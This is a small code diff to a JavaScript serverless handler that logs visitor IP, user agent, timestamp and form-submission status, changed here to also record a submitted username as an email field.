@@ -2,9 +2,10 @@ exports.handler = async (event) => {
     const ip = event.headers['x-forwarded-for'] || 'Unknown IP';
     const userAgent = event.headers['user-agent'] || 'Unknown User-Agent';
     const timestamp = new Date().toISOString();
-  
+
     const body = event.body ? JSON.parse(event.body) : {};
-  
+    const username = body.username || null;
+
     let formSubmittedStatus = 'site visited';
     if ('formSubmitted' in body) {
       if (body.formSubmitted === true) {
@@ -30,7 +31,8 @@ exports.handler = async (event) => {
           ip,
           user_agent: userAgent,
           timestamp,
-          form_submitted: formSubmittedStatus
+          form_submitted: formSubmittedStatus,
+          email: username
         })
       });
   
